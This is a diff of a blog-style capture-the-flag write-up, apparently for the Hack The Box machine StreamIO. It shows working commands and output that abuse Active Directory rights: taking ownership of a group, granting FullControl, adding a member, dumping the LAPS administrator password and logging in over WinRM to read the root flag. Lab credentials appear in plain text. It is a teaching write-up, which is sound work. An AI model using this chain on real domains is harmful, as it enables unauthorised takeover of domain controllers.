@@ -616,7 +616,7 @@ And we take a look on all those other users. <strong>nikk37</strong> is, who wou
 </ol>
 <p>This could be done using the WinRM session of nikk37 and the credentials of JDgodd with Powershell, but... I like to do those things without using Windows too much.</p>
 <p>Shouts out to Charlie Bromberg (Shutdown) for releasing his scripts and tutorial. He recently made some pull requests to impacket, adding the ability to change the owner of an object <a href="https://github.com/SecureAuthCorp/impacket/pull/1323">1323</a> and also edit DACLs <a href="https://github.com/SecureAuthCorp/impacket/pull/1291">1291</a>. These pull requests are tutorials itself, but he also published examples at <a href="https://www.thehacker.recipes/ad/movement/dacl/grant-ownership?q=owneredit">https://www.thehacker.recipes/ad/movement/dacl/grant-ownership?q=owneredit</a> and <a href="https://www.thehacker.recipes/ad/movement/dacl/grant-rights?q=owneredit">https://www.thehacker.recipes/ad/movement/dacl/grant-rights?q=owneredit</a>.</p>
-<p>We start with owneredit, reading the current owner</p>
+<p>We start with owneredit, reading the current owner. Someone has already made JDgodd the owner of the Core Staff group.</p>
 <div class="highlight"><pre><span></span><code>owneredit.py -new-owner jdgodd -target <span class="s2">&quot;CORE STAFF&quot;</span> -action <span class="nb">read</span> streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r
 Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022</span> SecureAuth Corporation
 
@@ -626,7 +626,18 @@ Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022<
 <span class="o">[</span>*<span class="o">]</span> - distinguishedName: <span class="nv">CN</span><span class="o">=</span>JDgodd,CN<span class="o">=</span>Users,DC<span class="o">=</span>streamIO,DC<span class="o">=</span>htb
 </code></pre></div>
 
-<p>How about DACLs?</p>
+<p>For completeness, I show the command that makes JDgodd as owner of "Core Staff"</p>
+<div class="highlight"><pre><span></span><code>owneredit.py -new-owner jdgodd -target <span class="s2">&quot;CORE STAFF&quot;</span> -action write streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r
+Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022</span> SecureAuth Corporation
+
+<span class="o">[</span>*<span class="o">]</span> Current owner information below
+<span class="o">[</span>*<span class="o">]</span> - SID: S-1-5-21-1470860369-1569627196-4264678630-1104
+<span class="o">[</span>*<span class="o">]</span> - sAMAccountName: JDgodd
+<span class="o">[</span>*<span class="o">]</span> - distinguishedName: <span class="nv">CN</span><span class="o">=</span>JDgodd,CN<span class="o">=</span>Users,DC<span class="o">=</span>streamIO,DC<span class="o">=</span>htb
+<span class="o">[</span>*<span class="o">]</span> OwnerSid modified successfully!
+</code></pre></div>
+
+<p>How about DACLs? We see that JDgodd has the WriteOwner privilege.</p>
 <div class="highlight"><pre><span></span><code>dacledit.py -principal jdgodd -target <span class="s2">&quot;core staff&quot;</span> -action <span class="nb">read</span> streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r
 Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022</span> SecureAuth Corporation
 
@@ -639,6 +650,82 @@ Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022<
 <span class="o">[</span>*<span class="o">]</span>     Access mask               : WriteOwner <span class="o">(</span>0x80000<span class="o">)</span>
 <span class="o">[</span>*<span class="o">]</span>     Trustee <span class="o">(</span>SID<span class="o">)</span>             : JDgodd <span class="o">(</span>S-1-5-21-1470860369-1569627196-4264678630-1104<span class="o">)</span>
 </code></pre></div>
+
+<p>Now we grant JDgodd full control over that group.</p>
+<div class="highlight"><pre><span></span><code>dacledit.py -principal jdgodd -target <span class="s2">&quot;core staff&quot;</span> -action write -ace-type allowed -rights FullControl streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r
+Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022</span> SecureAuth Corporation
+
+<span class="o">[</span>*<span class="o">]</span> DACL backed up to dacledit-20220619-143823.bak
+<span class="o">[</span>*<span class="o">]</span> DACL modified successfully!
+</code></pre></div>
+
+<p>And we check if it worked.</p>
+<div class="highlight"><pre><span></span><code>dacledit.py -principal jdgodd -target <span class="s2">&quot;core staff&quot;</span> -action <span class="nb">read</span> streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r
+Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022</span> SecureAuth Corporation
+
+<span class="o">[</span>*<span class="o">]</span> Parsing DACL
+<span class="o">[</span>*<span class="o">]</span> Printing parsed DACL
+<span class="o">[</span>*<span class="o">]</span> Filtering results <span class="k">for</span> SID <span class="o">(</span>S-1-5-21-1470860369-1569627196-4264678630-1104<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span>   ACE<span class="o">[</span><span class="m">2</span><span class="o">]</span> info
+<span class="o">[</span>*<span class="o">]</span>     ACE Type                  : ACCESS_ALLOWED_ACE
+<span class="o">[</span>*<span class="o">]</span>     ACE flags                 : None
+<span class="o">[</span>*<span class="o">]</span>     Access mask               : WriteOwner <span class="o">(</span>0x80000<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span>     Trustee <span class="o">(</span>SID<span class="o">)</span>             : JDgodd <span class="o">(</span>S-1-5-21-1470860369-1569627196-4264678630-1104<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span>   ACE<span class="o">[</span><span class="m">4</span><span class="o">]</span> info
+<span class="o">[</span>*<span class="o">]</span>     ACE Type                  : ACCESS_ALLOWED_ACE
+<span class="o">[</span>*<span class="o">]</span>     ACE flags                 : None
+<span class="o">[</span>*<span class="o">]</span>     Access mask               : FullControl <span class="o">(</span>0xf01ff<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span>     Trustee <span class="o">(</span>SID<span class="o">)</span>             : JDgodd <span class="o">(</span>S-1-5-21-1470860369-1569627196-4264678630-1104<span class="o">)</span>
+</code></pre></div>
+
+<p>Yes, it worked. The next step is to add a member to that group, because, if you remember, Core Staff members can read LAPS passwords for the DC. We are going to use the <strong>net</strong> utility.</p>
+<div class="highlight"><pre><span></span><code>net rpc group addmem <span class="s2">&quot;Core Staff&quot;</span> jdgodd -U <span class="s1">&#39;streamio.htb/jdgodd&#39;</span> -S <span class="nv">$TIP</span>
+Enter streamio.htb/jdgodd<span class="err">&#39;</span>s password:
+</code></pre></div>
+
+<p>There is no output, but we now try to read the LAPS password using CrackMapExec.</p>
+<div class="highlight"><pre><span></span><code>cme ldap <span class="nv">$TIP</span> -u JDgodd -p <span class="s2">&quot;JDg0dd1s@d0p3cr3@t0r&quot;</span> --module laps
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span>.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:streamIO.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+LDAP        <span class="m">10</span>.10.11.158    <span class="m">389</span>    DC               <span class="o">[</span>+<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:JDg0dd1s@d0p3cr3@t0r
+LAPS        <span class="m">10</span>.10.11.158    <span class="m">389</span>    DC               <span class="o">[</span>*<span class="o">]</span> Getting LAPS Passwords
+LAPS        <span class="m">10</span>.10.11.158    <span class="m">389</span>    DC               Computer: DC$                  Password: 3W7Z4<span class="o">}</span><span class="nv">$Wu2P0V</span>/
+</code></pre></div>
+
+<p>It totally worked, we got the LAPS password. We login using <strong>evil-winrm</strong> again, but no root flag in the Desktop directory. But there might be one at Martin's Desktop folder.</p>
+<div class="highlight"><pre><span></span><code>evil-winrm  -i <span class="nv">$TIP</span> -u administrator -p <span class="s1">&#39;3W7Z4}$Wu2P0V/&#39;</span>
+
+Evil-WinRM shell v3.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ls
+
+
+    Directory: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        <span class="m">2</span>/26/2022  <span class="m">12</span>:41 PM            <span class="m">274</span> clearing.bat
+
+
+*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ls ..<span class="se">\D</span>esktop
+*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ls <span class="s2">&quot;C:/Users/Martin/Desktop/&quot;</span>
+
+
+    Directory: C:<span class="se">\U</span>sers<span class="se">\M</span>artin<span class="se">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        <span class="m">6</span>/19/2022  <span class="m">11</span>:31 AM             <span class="m">34</span> root.txt
+
+
+*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> <span class="s2">&quot;C:/Users/Martin/Desktop/root.txt&quot;</span>
+f0873b557d5a24b8b77380938cb8623c
+</code></pre></div>
+
+<p>Done! Because we are nice, we run the <code>clearing.bat</code>, to reset the DACLs.</p>
   </div>
   <div class="tag-cloud">
     <p>
